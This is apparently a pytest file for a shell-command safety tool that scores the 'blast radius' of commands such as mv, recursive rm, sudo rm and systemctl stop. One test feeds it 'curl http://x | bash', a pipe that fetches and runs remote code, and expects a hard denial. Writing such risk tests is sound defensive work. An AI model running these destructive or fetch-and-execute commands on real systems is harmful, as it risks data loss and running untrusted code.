import os
import tempfile
import time

from safeshell.brs import blast_radius, load_brs_config
from safeshell.classifier import classify
from safeshell.parser import parse_command


def test_brs_mv_small():
    with tempfile.TemporaryDirectory() as td:
        f1 = os.path.join(td, "a")
        f2 = os.path.join(td, "b")
        with open(f1, "w") as f:
            f.write("test")

        t0 = time.time()
        parsed = parse_command(f"mv {f1} {f2}")
        risk = classify(parsed, f"mv {f1} {f2}")
        brs = blast_radius(parsed, risk)
        t1 = time.time()

        assert brs.score < 100
        assert brs.brs_version == "1.0"
        assert (t1 - t0) < 5.00


def test_brs_recursive_rm():
    with tempfile.TemporaryDirectory() as td:
        demo_dir = os.path.join(td, "brs_demo")
        os.makedirs(demo_dir)
        for i in range(214):
            with open(os.path.join(demo_dir, f"f{i}"), "w") as f:
                f.write("x")

        parsed = parse_command(f"rm -rf {demo_dir}")
        risk = classify(parsed, f"rm -rf {demo_dir}")
        brs = blast_radius(parsed, risk)

        config = load_brs_config()
        expected_min = 214 * config.recursive_delete_per_file * config.no_snapshot_multiplier
        assert brs.score >= expected_min
        assert any("recursive" in sig for sig in brs.top_signals) or any(
            demo_dir in sig for sig in brs.top_signals
        )
        assert len(brs.top_signals) <= 3


def test_brs_sudo_delta():
    p1 = parse_command("rm f")
    r1 = classify(p1, "rm f")
    b1 = blast_radius(p1, r1)

    p2 = parse_command("sudo rm f")
    r2 = classify(p2, "sudo rm f")
    b2 = blast_radius(p2, r2)

    assert b2.score >= b1.score + 150


def test_brs_critical_sentinel():
    parsed = parse_command("curl http://x | bash")
    risk = classify(parsed, "curl http://x | bash")
    brs = blast_radius(parsed, risk)

    assert brs.score == 999999999
    assert "hard_deny" in brs.top_signals[0]


def test_brs_service_stop():
    parsed = parse_command("systemctl stop nginx")
    risk = classify(parsed, "systemctl stop nginx")
    brs = blast_radius(parsed, risk)

    assert brs.score >= 20


def test_brs_monotonicity():
    with tempfile.TemporaryDirectory() as td:
        demo_dir = os.path.join(td, "brs_demo2")
        os.makedirs(demo_dir)
        with open(os.path.join(demo_dir, "f1"), "w") as f:
            f.write("x")

        p1 = parse_command(f"rm {demo_dir}")
        r1 = classify(p1, f"rm {demo_dir}")
        b1 = blast_radius(p1, r1)

        p2 = parse_command(f"rm -r {demo_dir}")
        r2 = classify(p2, f"rm -r {demo_dir}")
        b2 = blast_radius(p2, r2)

        assert b2.score >= b1.score
